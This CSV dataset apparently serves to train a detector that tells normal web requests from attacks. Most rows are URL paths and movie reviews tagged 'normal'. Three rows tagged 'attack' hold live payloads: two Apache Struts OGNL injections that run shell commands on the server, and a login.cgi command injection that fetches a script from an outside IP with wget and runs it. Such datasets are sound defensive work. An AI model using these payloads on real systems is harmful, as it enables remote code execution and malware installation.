post,tags
/phpMyAdmin/phpMyAdmin/index.php,normal
/mt/know-how/2017/04/vulnerable-sample-code--os-command-injection-.html,normal
/mt/know-how/2017/02/,normal
/admin/PMA/index.php,normal
/mt/blog/author/gamzatti/2017/02/,normal
/mt/mt-static/addons/Community.pack/themes/tristan-blue/bullet.gif,normal
/help/user/index.html,normal
Following on from the huge success of Nick Park and the Aardman team with the Wallace and Gromit short animations we now have the first (hopefully of many) feature with the plasticine characters that so many love. The DVD of the movie has proved to be the most durable and best used of my two children's many Christmas presents by a long way. The plot of the movie is straightforward enough but the beauty of the W & G films for me is the background gags. There are plenty of up front gags and slapstick for kids and adults to enjoy but the background is the killer for me. All in a classy addition to an already classy filmography for Nick Park etal and I would recommend fans and new watchers to see this film....often.,normal
"I kind of like JAG. It do have itォs charm but lately itォs to much propaganda in it. For an outsider (a non American) the patriotic feeling can be a bit to much.<br /><br />I donォt like that Rabb and MacKenzie goes from being lawyers (as they were in the early parts of the TV show) to become super heros that stops wars and rescues entire continents. Its almost like watching a recruitment video from the US army.<br /><br />I still watch the show, so itォs not that bad. But i would prefer more episodes when Rabb and MacKenzie investigates military accidents and donォt save the world in the future.",normal
"This movie is sad. According to my fellow IMDb users, (*SPOILER*) RAPTOR uses stock footage from the Carnotaur films. Well, since I have not seen the Carnotaur movies, I cannot say. But, I do notice some pretty bad editing and even worse acting. This movie is one big steaming pile of s***. It makes absolutely no sense. Here is this thing that calls itself a PLOT: Mad scientist re-creates raptors. Raptors kill people. Sheriff investigates. *SPOILER* (although I don't know what it is that I'm spoiling) Sheriff catches on to mad doctor's plans. Army guys are sent in and raptors start killing army guys. Raptors. Yeah, right. I could make a clay figure that looks more real. The FX are the cheapest ever used in a movie. There is a lot of gore. Cheap gore. It doesn't even look real. I will agree with another person who rated this movie that the only thing this movie has going for it is the fact that it ends. There are about two seconds of originality in this film. And that only comes from when the sheriff is talking to some tax agent on the phone about his electric bill or something. This idea has been used in about 100,000 other movies with 100,000 different names. Overall, I'm gonna give RAPTOR 1/5 just because it ended.",normal
/robots.txt,normal
/struts_chat/board/board.action,normal
/Template/Default/Skin/user/images/login_back.jpg,normal
"This is bad movie. There is no denying it as much as I'd like to. Tommy Lee Jones is about as good as he possible can be with the script they gave him, and he had a couple of decent action sequences that felt really out of place due to their acceptable quality.<br /><br />Somewhere along the line someone figured that all of the shortcomings of script could be counteracted if they were to hire every single workhorse actor in the business, unfortunately even truly, deeply talented actors like Goodman, Beatty, Sarsgaard, Gammon, Steenburgen, MacDonald, Pruitt Taylor Vince, and lest we forget Mr. Jones himself can't fix the wooden dialogue, and plot progression that went absolutely nowhere.<br /><br />In fact at one point I looked up, sure that the movie had been running for the past 2 hours only to find that I was 51 minutes into it.<br /><br />Perhaps the most painful point of the movie was the subplot about the ghost confederate soldiers that seem to be of little to no help to the story. Other than slightly detracting from the confusing business at the end with the picture. *if you haven't seen this movie disregard this past statement which may seem tantalizing and know that it is not, you will not understand it any better after having watched the movie.<br /><br />The most interesting thing about this movie may be that it is actually a sequel to the movie ""Heaven's Prisoners"" starring Alec Baldwin in the same role carried by Tommy Lee Jones in this movie. I may have to watch it now, first to see if it is as bad as In the Electric Mist, and second because I can't seem to (no matter how hard I try) break my man crush on Alec Baldwin.",normal
"***SPOILERS*** ***SPOILERS*** There's not much that can be said about this early-talkie era flick. (I'm hesitant to call ""Cimarron"" a ""film"", because I feel that the word is too esoteric.) But what can be said about it...mainly speaks against it.<br /><br />Take, for example, the overuse of portraying Indians as bad folk. In one scene, the little boy of the flick's lead character--an overbearing and over-ambitious family man who wants to set up a newspaper business-- is playing just outside of his father's office. An Indian kneels down in front of the child. ""Hello,"" the boy says to the Indian, in a very polite manner. The Indian gives him a feather, stands up and walks off.<br /><br />Yancy Cravat, Jr. excitedly runs inside the office. ""Mommy! Mommy!"" he shouts, holding up the Indian's gift. ""Look what an Indian gave me!""<br /><br />""How many times do I have to tell you!"" she snaps at the boy. ""You aren't ever to talk to those filthy Indians!""<br /><br />Yancy Yates, Sr. (Richard Dix) comes across as a man who speaks with a forked tongue. At the start of the story, he seems to have a definite plan for giving his family a better life. But, we soon enough discover, he's no great over achiever--much less a totally good-moral minded man. His slave child, Isaiah (Eugene Jackson) is one tell-tale sign of this.<br /><br />Upon his family's first trek to a Sunday morning church service--one<br /><br />at which, curiously enough, Cravat is to give the sermon--Isaiah tries to come along, dressed up like Cravat, long-tail suit, holster, gun and all. Cravat tells him to go home. ""Ya' all doesn't want me to come with ya' ta church?"" Isaiah says with a pout.<br /><br />""No!"" Cravat corrects him, patting him on the shoulder. ""You don't understand! I want you to stay and guard the house. And if anyone at all comes along... you shoot him dead!""<br /><br />The characters--not to mention the actors--in ""Cimarron"" couldn't<br /><br />act their way out of burlap sacks, despite their obvious efforts. And nothing in the script was any too commendable, either. (Granted: the incomparable Edna May Oliver--notorious for playing the Red Queen in Alice In Wonderland, also released in 1931--actually manages to look good, pulling off her portrayal of a pompous old woman, which is what she's also been best-known for.) But, aside from that, well...<br /><br />Yancy Yates isn't popular in town from the first week he arrives,<br /><br />and one of the outlaws decides to shoot Cravat's white hat off as he and his wife (Irene Dunne) are casually walking by. Despite her anger with the man who fired the bullet, Cravat just takes it completely in stride.<br /><br />Not only was this story not ""shooting for realism"", but it was very<br /><br />lacking in several key areas: e.g., Cravat's newspaper isn't ever really seen. (Bulletins and posters, yes--but not any newspaper.)<br /><br />Perhaps strangest of all, though: this is set in a small town in<br /><br />Kansas. Yet, for some reason or other, Yancy Cravat is dead-set on<br /><br />calling his paper ""The Oklahoma Wig-Wam.""<br /><br />Really good westerns have always been very few and far between--the only exceptions being Clint Eastwood's so-called ""spaghetti westerns"" of the late '60s to early '70s. Cliche westerns, on the other hand, are a dime-a-dozen.<br /><br />If you like cliche westerns, ""Cimarron"" will do you proud--but, as for me... it did me embarrassment.<br /><br />",normal
/admin/index.php,normal
"During the War for Southern Independence, GENERAL SPANKY mobilizes his forces to defend the local women & children against a Yankee invasion.<br /><br />In 1936, Hal Roach decided it was time for his popular OUR GANG kids to branch out into occasional feature-length films. With the big success of Shirley Temple in two Civil War period movies in 1935 (THE LITTLE COLONEL, THE LITTLEST REBEL), it was only natural that Roach would look in that same direction for his GANG. Although given a rather lavish production and distributed by MGM, GENERAL SPANKY was not a critical or box-office success. The little GANGsters would henceforth stick to short subjects.<br /><br />Although he's given top billing & the title role, George 全panky' McFarland is rivaled throughout the film's first half by little Billie 腺uckwheat' Thomas. Here were two of the finest young actors to ever appear in American movies. With all the experience of old, seasoned pros, these two gamin could steal scenes & hearts with equal bravado. A constant joy, without a false note between them, they provide the essential reason for watching the film today.<br /><br />Phillips Holmes gives a quiet, gentlemanly performance as Spanky's adult protector. Nearly forgotten now, Holmes was a fine actor who died much too soon, during World War Two. Genial Ralph Morgan is especially good as a sympathetic Union general - his scenes with Spanky are quite amusing.<br /><br />Other OUR GANGers appear midpoint into the movie, most notably Carl 羨lfalfa' Switzer; he gets to warble 遷ust Before The Battle, Mother.' Even pretty Rosina Lawrence (the GANG's schoolmarm) shows up to play Holmes' beloved.<br /><br />Irving Pichel is particularly slimy as a cowardly cardsharp turned vindictive Yankee captain. Bumbling Willie Best & feisty Louise Beavers play Miss Lawrence's slaves.<br /><br />It should be noted that there is racism in the film, not unusual for Hollywood of that era - but almost completely missing in the original series of OUR GANG shorts.<br /><br />Fans of 19th Century music will enjoy paying attention to the soundtrack, which is a long succession of ancient tunes.",normal
/myadmin/index.php,normal
/mt/mt-static/addons/Community.pack/themes/tristan-blue/logo.gif,normal
/mt/shatiku/archives.html,normal
/user/register/,normal
"Let's not kid ourselves, this atrocity is not Plan Nine or Cat Women. It is bad, period! The performances vary from drama school theatrics (Marla English) to a 'couldn't care less' walk through (Tom Conway). The photography (even in a good print) is so murky it is occasionally hard to see what is happening. The real problem, however, is the aimless, pointless, nearly plot less story and the leaden, paceless direction. At a brisk 77 minutes it still feels endless.<br /><br />The screenplay is especially inept. There are two story lines that only intersect at the very end of the picture. Tom Conway is trying to create a super race, using voodoo and modern science (although there is little science in evidence) which he can control telepathically. He is keeping his wife prisoner (for no discernible reason). Meanwhile a couple of petty crooks and a white hunter type guide are trying to find the village in which he is working, in the expectation of gold and jewels. When they finally arrive, Tom Conway decides that one of them, the woman, is the perfect subject for his experiments. She is turned into a monster, kills Conway (natch!) and then reverts to normal. She sees a gold statue half drowned in a boiling pool, tries to retrieve it and falls in the water and apparently drowns. The white hunter rescues the wife. In the final shot we see the supposedly drowned woman emerge as the monster again; threatening a sequel (now that really is a scary thought!).<br /><br />The AIP producer, Samuel Z Arkoff, in a lecture included on the DVD, prides himself on spotting the teenage niche market and satisfying it with ingenious low budget movies. However, it is difficult to see how anyone could think this rancid concoction would satisfy any sort of audience. What appeal do they think it could possibly have? The monster appears so rarely that it could hardly be called a horror film. The jungle action is tepid and tedious. There are no teenagers in it and no characters that teenagers could be expected to identify with.<br /><br />The producers exposed 77 minutes of film, but they didn't make a movie. This is a con trick and Arkoff should be ashamed of his association with it.",normal
/cgi-bin/mt/mt-comments.cgi,normal
"I saw this television version of a Christie mystery story when it was shown back on Channel 5 in New York City in 1980. At the time I was surprised it was not shown on Channel 13, the Public Television Station that showed most of the Masterpiece Theater programs, but (aside from some Dorothy Sayers ""Lord Peter Wimsey"" stores, and THE MOONSTONE) the BBC productions rarely dealt with British detective stories. Another series, THE RIVALS OF SHERLOCK HOLMES had dealt with stories set in the Victorian and Edwardian period, so a period charm was involved in getting those stories onto Channel 13.<br /><br />The plot of WHY DIDN'T THEY ASK EVANS? dealt with a young couple stumbling upon a dying man who's only last words are the question of the title of the story (the novel was originally called WHY DIDN'T THEY ASK EVANS?, but subsequently was retitled THE BOOMERANG CLUE). The young couple start investigating the murder, and trace the crime to a set of people who surround a questionable doctor (Eric Porter). Despite the warnings of the father of the hero (John Gielgud), the hero (James Warwick) and the heroine (Francesca Annis) pursue their investigation - even as it gets murkier and more dangerous. The death of another suspect by suicide increases the apparent dangers as the killer starts looking into silencing the two amateur detectives.<br /><br />It's not a bad film, although I agree it was a bit too long for a single night's entertainment (if it had been done like later Miss Marple episodes with Joan Hickson, or the Hercule Poirot episodes, in two parts it would have been better). But it has it's strengths. One is the proper use of Porter as chief suspect, and a clever scene later in the film where he appears to be spying on the young couple who are investigating the mystery. If you stick to the film, you will be in for a fair surprise later on.<br /><br />But it has one failing. When dealing with a Christie novel the figures in the story have to be in a rigid schedule of movements so that the reader might be able to figure out what the secret of the plot is. I will only add that if you hear the dialog at one point, and how a little boy was almost killed (but wasn't), then you will find all the parts of the story coming together, and what the villain's motivations were.<br /><br />Except for that and the lengthy time the telefilm takes to tell it's story, it is quite a good film, and worthy as one of the best programs based on a Christie story in the period when their was a sudden renaissance in films based on her novels.",normal
"Elfriede Jelinek, not quite a household name yet, is a winner of the Nobel prize for literature. Her novel spawned a film that won second prize at Cannes and top prizes for the male and female leads. Am I a dinosaur in matters of aesthetic appreciation or has art become so debased that anything goes?<br /><br />'Gobble, gobble' is the favoured orthographic representation in Britain of the bubbling noise made by a turkey. In the film world a turkey is a monumental flop as measured by box office receipts or critical reception. 'Gobble, gobble' and The Piano Teacher are perfect partners.<br /><br />The embarrassing awfulness of this widely praised film cannot be overstated. It begins very badly, as if made to annoy the viewer. Credits interrupt inconsequential scenes for more than 11 minutes. We are introduced to Professor Erika Kohut, apparently the alter ego of the accoladed authoress, a stony professor of piano. She lives with her husky and domineering mum. Dad is an institutionalised madman who dies unseen during what passes for the action.<br /><br />Reviewing The Piano Teacher is difficult, beyond registering its unpleasantness. What we see in the film (and might read in the book, for all I know) is a tawdry, exploitative, nonsensical tale of an emotional pendulum that swings hither and thither without moving on.<br /><br />Erika, whose name is minimally used, is initially shown as a person with intense musical sensitivity but otherwise totally repressed. Not quite, because there's a handbags at two paces scene with her gravelly-voiced maman early on that ends with profuse apologies. If a reviewer has to (yawn) extract a leitmotif (why not use a pretentious word when a simpler one would do), Elrika's violently alternating moods would be it.<br /><br />A young hunk, Walter, studying to become a 'low voltage' engineer, whatever that is, and playing ice hockey in his few leisure moments, is also a talented pianist. He encounters Elrika at an old-fashioned recital in a luxury apartment in what may or may not be Paris. In the glib fashion of so much art, he immediately falls in love and starts to 'cherchez la femme'.<br /><br />Repressed Erika has a liking for hardcore pornography, shown briefly but graphically for a few seconds while she sniffs a tissue taken from the waste basket in the private booth where she watches.<br /><br />Walter performs a brilliant audition and is grudgingly accepted as a private student by Erika, whose teaching style is characterised by remoteness, hostility, discouragement and humiliation.<br /><br />He soon declares his love and before long pursues Erika into the Ladies where they engage in mild hanky panky and incomplete oral sex. Erika retains control over her lovesick swain. She promises to send him a letter of instruction for further pleasurable exchanges.<br /><br />In the meantime, chillingly jealous because of Walter's kindness to a nervous student who is literally having the shits before a rehearsal for some future concert, Erika fills the student's coat pocket with broken glass, causing severe lacerations to those delicate piano-playing hands.<br /><br />The next big scene (by-passing the genital self-mutilation, etc) has Walter turning up at the apartment Erika shares with her mother. Erika want to be humiliated, bound, slapped, etc. Sensible Walter is, for the moment, repulsed and marches off into the night.<br /><br />At this point there's still nearly an hour to go. The viewer can only fear the worst. Erika tracks down Walter to the skating rink where he does his ice hockey practice. They retire to a back room. Lusty Wally is unable to resist the hands tugging at his trousers. His 'baby gravy' is soon expelled with other stomach contents. Ho hum.<br /><br />Repulsed but hooked, perhaps desirous of revenge for the insult so recently barfed on the floor, Walter returns to Erika's apartment. Can you guess what happens now? It's not very deep or difficult. Yes, he becomes a brute while Erika becomes a victim. One moment he's locking maman in her room and slapping Erika, the next he's kicking her in the face, having sex with her and renewing his declarations of love. <br /><br />Am I being unfair in this summary? Watch the film if you want, but I'd advise you not to.<br /><br />Anyone can see eternity in a grain of sand if they're in the right mood. I could expatiate at the challenging depiction of human relationships conveyed by this film if I wanted. But I 'prefer not to', because this is a cheap and nasty film that appeals to base instincts and says nothing.<br /><br />I'm supposed to say that parentally repressed Erika longs for love, ineffectively seeks it in pornography, inappropriately rejects it when it literally appears, pink and throbbing, under her nose, belatedly realises that she doesn't like being hurt, blah, blah, blah.<br /><br />The world has, for reasons not explained, stunted her. She apparently makes a monster out of someone who appeared superficially loving - but surely we all know that any man is potentially a violent rapist, because that's his essential nature however much he tries to tell himself and the world otherwise.<br /><br />At the end, if you have the patience to be there, there's a small twist. Before going to the final scene, where she's due to perform as a substitute for the underwear-soiling student with the lacerated hands, Erika packs a knife in her handbag. For Walter?<br /><br />Yes, you're ahead of me. She stabs herself in a none life-threatening area and leaves. Roll credits.<br /><br />If this earned the second prize at Cannes, just how bad were the rest of the entries?",normal
/sipura/,normal
"When I was 13 or so I was lucky enough to find this film. It was part of an endless Danish series of really cheesy stuff. This however was the cheesiest I ever owned - but I guess I sold it, too bad. Well what to write... Better than ""Manos: the hands of fate"" and worse than ""Critters 4"". But it's definitely worth an hour and a half since this was made by people who wanted to make it. The acting isn't that terrible compared to several other eighties trash - in fact I kind of like the old man even though he did'NWT look that Indian to me. But I guess you can't have everything... Do yourselves a favour and look this up...",normal
"I think it is saying something that the Bollywood ""Bride and PRejudice"" stayed more faithful to the source material than this 2005 Hollywood version did. I also laughed more at the Bollywood version. (Mr. Kholi? Priceless!) If you have read the book or seen the 1995 BBC version (and liked them), you will be in for a nasty surprise going in to this film then. My friend however, who had seen neither, was mildly amused by the film. If you are a JAne Austen purist though, or even a film-goer who dislikes historical inaccuracies, it will be painful to sit through this.<br /><br />Ugh, the script. The script was the biggest problem. I imagine the actors wouldn't have fared half so badly if they'd had a decent script, perhaps penned by somebody who actually loved Austen's work.<br /><br />What travesties were committed? Well, you'll be forced to endure such incredulous lines as ""Don't you dare judge me, Lizzy!"" and ""Leave me alone for once in your lives!"". Not only are such lines far from anything that could come from Jane Austen's eloquent pen, but can anyone honestly believe words like that spilling from the mouth of a genteel young lady from the Regency era? The usage of modern colloquialisms is one of the many irritating ways that the screenwriter butchers the book. The writer also decided to give characters lines that, in the book, were said by a completely different characters and all for no apparent purpose. Worse of all, when they do try to stick a bit closer to the book's writing, the screenwriter has a nasty and unnecessary habit of rearranging Austen's phrases and substituting awkward synonyms for her already perfect words. It was as if the screenwriter sat down with the book in one hand and a thesaurus in the other when writing the script. Stick to Austen's words; she did it better than you! I assume all of this was done in a ""revisionist"" spirit and in an effort to distance this film from the iconic 1995 BBC version. However, for me, it also made a travesty of the true spirit of Austen's most beloved work.<br /><br />The casting did have potential, though it was quickly dashed away once the script kicked in. But Keira, giggling excessively and baring your crooked teeth does not equal charm and vivacity! And I think Mr. McFayden, though I find him tolerably handsome enough, misread his script and was under the impression he was playing Heathcliff and not the formidable Mr. Darcy. I really did enjoy Brenda Blethyn, Kelly Reilly and the actor who played Mr. Collins. Their interpretations were really rather refreshing.<br /><br />Oh, but Donald Sutherland! Somebody described his performance as seeming like a hobo who had accidentally wandered onto the movie set and I must say it is an apt description. And can somebody tell me why they fashioned Wickham after Legolas? Though he was in the movie for under two minutes, I daresay, and without his impressive archery skills to perk up the movie.<br /><br />On a wardrobe note, I would kill for Miss Bingley's dresses because they were sumptuous and would fit in more with the modern century. (A sleeveless Regency evening gown? Please! More Versace than Austen, that is sure) And poor Keira, all of the budget went to her salary and not her wardrobe! Oh, and I'm sure they eventually caught the bastard who stole the one hairbrush from the movie set. Unfortunately, they didn't catch him soon enough to comb the actresses' tresses before filming rolled.<br /><br />In short, with this new Hollywood version, bid adieu to Austen's eloquence, subtlety and wit because you'll be getting the complete opposite.",normal
/mt/blog/2017/03/post-1.html,normal
"Somehow, somewhere, someplace.. you GOTTA see this film. Breath taking aerials, and incredible outstanding performances from highly gifted actors.You think Cirque du Soleil blows your mind,wait till you see what these 2 women do - most importantly, the emotional journey and struggles Jane(Dreya Weber) faces are universal in theme to many women. A superbly directed film which deals with the complexities of relationships,and holding on, until you're ready to let go. This masterpiece will touch women and men alike. Ned Far (director/writer) and ridiculously talented Dreya Weber (star/producer) just had the guts to tell it, honestly and sincerely. This film will hit big - see it HOWEVER you can - or you won't be ""in the loop"" when it becomes one of the most talked about films.",normal
/favicon.ico,normal
"For their credit, this is one of their more competent pieces of trash, and that's because there's considerably good gore, and an interesting take on ripping off ""Snakes on a Plane."" But, if there's any more of example of the inconsistency behind Asylum's newest rip-off it's the two characters at the beginning whom are illegal immigrants and can't understand nor speak English to a Texas man sneaking them across the border, yet when they get on a train and meet a friend, they begin understanding and speaking perfect English.<br /><br />Aside from being a pretty bad depiction of a Hollywood formula, ""Snakes on a Train"" is utterly boring. At least, with ""Snakes on a Plane"" we were given the chance to watch actors wax comedic and attempt to be remotely interesting. The Mallachi Brothers installment features some of the most boring characters I've ever seen, from an electrical engineer (gee, I wonder how he comes in handy later on), to some stoner surfers, right down to our two main characters attempting to fight off the snake curse that lurks in the husband's wife.<br /><br />""Snakes"" is never entertaining, and even when it's very gory, it's still never as good as it has the chance to be, because ""Snakes"" could have been a funny short film, and instead just takes itself much too seriously, and never camps it up at any moment. Instead of taking their small budget and making original films that can set a precedent, they instead force their small budget to work against them in these knock offs. While the Mallachi brothers seem to be trying, the train just looks incredibly artificial.<br /><br />It seems almost like a stage play with these inconsistent and awfully bland set pieces that try desperately to look like actual train cars, while every so often it shakes, the background of the windows are blurred, and the sound effects go off every now and then to let us know they're actually on a train; not to mention that in such a large extended train there only seems to be about ten passengers on it. And beyond the train fight, and a drawn out sex scene, we're forced to be subjected to a plot that makes zero sense. And not even the directors can work around the fact that the ""lethal"" snakes that go on this train look far from venomous or dangerous.<br /><br />The rest of the film staggers onto only about a minute of snake carnage and a bad subplot of an ex drug agent trying to molest a passenger. All of this dull exposition ends with a really ridiculous climax in which a poorly computer generated snake (I saw better animation on the Super Nintendo) completely swallows the train whole, and is then dispensed in a method that should have been exercised from the very beginning. Asylum scores again.<br /><br />Asylum scores yet again with a hackneyed, lazy, horribly directed, and boring rip-off of another better film. ""Snakes on a Train"" takes itself way too seriously, and that's why it's never entertaining or memorable.",normal
"I really wanted to love this film. I have read the book to my daughters and we all loved it. The book is marvelous. This film is very far from the book. The book is splendid - this film is an awful adaptation.<br /><br />In the book, Sara is honorable, kind, strong, and NEVER does anything spiteful to get back at anyone. That's the POINT of the book! She behaves as a ""princes"" regardless of circumstances. An important part of behaving like a princess is to not return unkindness. It is to behave honorably regardless of how you are being treated.<br /><br />In the book, she endures much and touches the lives of others. Other people change their behaviors after they witnessed her kindness and ability to endure without sinking to spite and vengefulness. Sara does what is right simply BECAUSE it is RIGHT.<br /><br />Outside of the bakery, she comes upon a beggar girl who is more poor and hungry than she is. She has half a dozen hot buns. She is VERY hungry. She gives one bun to this wild looking little girl huddled on the doorstep of the bakery. When she sees how ravenous the girl is and watches her gobble the bun, she gives her another. She continues to do this until she has given 3 or 4 I think - I don't remember how many.<br /><br />The baker is watching through the window. She is so moved by what she has witnessed, she takes the beggar girl in and raises her as her own daughter. Other people are similarly influenced by Sara.<br /><br />And in the book, her father has died. The man next door is her father's partner - he has been looking for her. Her father did not lose his money after all - the man is thrilled to find Sara; he takes her and Becky into his home and raises them as his daughters. And Sara has her full inheritance, of course.<br /><br />Miss Minchin is not a chimney sweep. In fact, she remains in her same post at the school. But she is humiliated as Sara has told her new guardian of the cruel treatment she received. And Sara does speak to Miss Minchin in the end - Miss Minchin is trying to minimize her treatment of Sara and Sara with a calm steadfast demeanor, instructs Miss Minchin that she had been cruel.<br /><br />There is no comeuppance for Miss Minchin. She continues on in her miserable existence. It does not matter - what matters is that Sara has a home with a guardian who loves her - and her dearest friend in the world, Becky, is now for all intents and purposes, her sister.<br /><br />The book is about love and honorable behavior under the worst of circumstances. It is about self control and humility. It is a wonderful book. This film does NOTHING to capture the true story and messages of the book. My wife was so disgusted with it, she wanted to leave the theater in the middle, but we decided to stick it out. We were not rewarded.<br /><br />I cannot for the life of me think of a reason the film makes should alter this excellent book in such a bad direction. Perhaps it was the influence of the ghastly screenplay from the book that Shirley Temple acted in. I don't know - but this film is so far from the book in character and values that I do not recognize it.<br /><br />Don't waste your time - buy the book. It is unforgettable... even for a dad!",normal
"The directing is brilliant, the casting is remarkable (though I would've loved to have seen a little more of Aaron Lustig (from Y & R fame), who played Paul Shaffer). I only have two minor quips about the film, as subtle as they are. One- Roebuck's Leno is excellent, but his stage presence (i.e. during what appears the taping of one of his late show episodes) is a tad underwhelming. Two- the distribution of the foul language. I am willing to tolerate foul language, so long as it is not used gratuitously, and to a degree, the film was gratuitous. The language seemed to be used as a tool to reduce the pathos of Bates' otherwise well-portrayed Kushnick by her frequent use of it, and served to make Roebuck's Leno a goody-goody by his lack of use of it (of course, if the characters really did behave this way, kudos to everybody). Nonetheless, the piece is an excellent one, as far as television and video are concerned. The film, I feel, had potential for the big screen, but would've required re-casting for the bit parts, and probably a different director, as well (the aesthetic feel is that of the Larry Sanders show, good for HBO, mediocre for cinematic purposes).",normal
"As I read the script on-line, I thought ""Capote"" needed a trim. Having just seen it on PPV, I can tell you it wasn't trimmed, it was butchered like that poor family! Example: in the script, Truman dubs Shawn ""Adorable One""; here, he is ""Mr. Shawn"".<br /><br />Bad enough the amateurs behind this movie de-flame Capote and bash his circle (are we to really believe they thought so little of Nelle, they mangled her little opus like an obnoxious in-joke?), they turn Perry Smith into this oh-so-sensitive victim, even as he's shown dispatching the Clutters. It's one thing to fudge the facts, it's another to drop the ball: the executions were carried out between 12:45-1:19 AM, April 14; Truman is shown at the prison 22 HOURS LATER!<br /><br />I was totally underwhelmed by the ""acting"". Keener doesn't even try to sound like an Alabama native. The way Cooper kept shouting ""Alvin!"", I was waiting for the Chimpmunks to show up! Hoffman gives us not the charming gadfly, but a pathetic suck-up who sees an horrific act as his ticket to the big time. When Hoffman whines about being ""tortured"" by the endless appeals, I wanted to give him a shotgun so he could do us both a favor and blow his brains out!",normal
/dbadmin/index.php,normal
/mt/mt-static/themes-base/blog.css,normal
/img/pic/login/top-left.jpg,normal
/mt/know-how/,normal
/phpmyadmin/index.php,normal
/images/Default_bg_002.gif,normal
/struts_chat/board/board.action,normal
"I'm still laughing- Not! I'm still asking my myself what the point was. I barely got a chuckle, this movie sucks. It tries to be charming and touching, but it turns out stupid. I do not recommend it.",normal
"/struts_chat/board/board.action?method:#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,@java.lang.Runtime@getRuntime().exec(#parameters.command[0]),new java.lang.String=&res=com.opensymphony.xwork2.dispatcher.HttpServletResponse&command=pwd",attack
"I bought the DVD a long time ago and finally got around to watching it.I really enjoyed watching this film as you don't get the chance to see many of the more serious better quality bollywood films like this. Very well done and but I would say you need to pay attention to what is going on as it is easy to get lost. When you start watching the movie, don't do anything else! I would actually advise people to read all the reviews here...including the ones with spoilers, before watching the movie. Raima Sen gave her first great performance that I have seen. Aishwarya was easily at her best. All performances were strong, directing and cinematography...go watch it!",normal
/mt/shatiku/2017/08/post-3.html,normal
/phpMyAdmin.old/index.php,normal
"Ugh. Even the ever-popular Diane Lane could not save this movie, and the most exciting thing about the movie was seeing if Rourke's face would move. One has heard so much ""gossip"" about his botched face lift, etc., so like an accident on the side of the road, we just had to slow down and see the wreck. The plot was thin. Here we have a very professional mob hit man who somehow latches on to a wild and uncontrollable punk/crook, and throughout this movie we're wondering why this guy stays with this idiot, let alone gets together with the guy in the first place. Then the crime that was not even committed has the pro to go after the witnesses. He would have popped them right then and there. But then, we would not have had a movie then, would we? And why did the realtor even agree to the extortion? There were more holes in this flick than in my colander. The acting was horrid, the entire movie predictable down to the minute, and even the ending. And so much could have been done to make this a much better movie. But if you have about 90 minutes to kill and not have to use any brain cells in the process, then this movie is just what the doctor ordered.",normal
/mt/prism/2017/04/the-way.html,normal
/struts_chat/board/board.action,normal
/mt/know-how/2017/02/implementation-of-ssl.html,normal
/admin/Admin_Login.asp,normal
/mt/blog/create-entry.html,normal
/img/reverseEdge.jpg,normal
/login.cgi?cli=aa aa';wget http://185.62.190.191/r -O -> /tmp/r;sh /tmp/r'$,normal
"Fool for Love is one of the several now forgotten films Robert Altman directed throughout the 1980s. This one, a screen adaptation of a Sam Shepard play that features Shepard in the lead role, just simply isn't very good. Altman made many not-very-good films over the course of his fascinating career, and many times the fault was his. But here I think the fault lies with Shepard for writing such a flimsy play. Altman's direction is assured, the performances are o.k. given what the actors have to work with, but this inconsequential screenplay goes nowhere, and takes its time getting there.<br /><br />Shepard is Eddie, a stuntman who has a love/hate relationship with May (Kim Basinger). The two fight endlessly over the course of an evening spent in some dusty motel in the middle of nowhere, while a mysterious man (Harry Dean Stanton) who may be either a figurative or literal father to both Eddie and May quietly observes. Randy Quaid rounds out the four-person cast as a gentleman caller.<br /><br />The only dramatic hook in the entire plot is the suggestion that Eddie's and May's relationship is incestuous. However, this hook feels more like a gimmick than anything. The screenplay doesn't explore their relationship in any detail, and it doesn't use their relationship to explore any more universal themes. Shepard and Basigner create eccentric, mannered characters who grow irritating within the first five minutes; Stanton and Quaid have little to do but provide reaction shots. <br /><br />The last half hour or so of the film is especially bad, when Eddie's and May's back stories begin to play out in flashback over monotone, somnolent voice over.<br /><br />Chalk this up to another of Altman's experiments gone awry.<br /><br />Grade: C-",normal
"/struts_chat/board/board.action?method:#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,@java.lang.Runtime@getRuntime().exec(#parameters.command[0]),new java.lang.String=&res=com.opensymphony.xwork2.dispatcher.HttpServletResponse&command=touch /tmp/exploit",attack
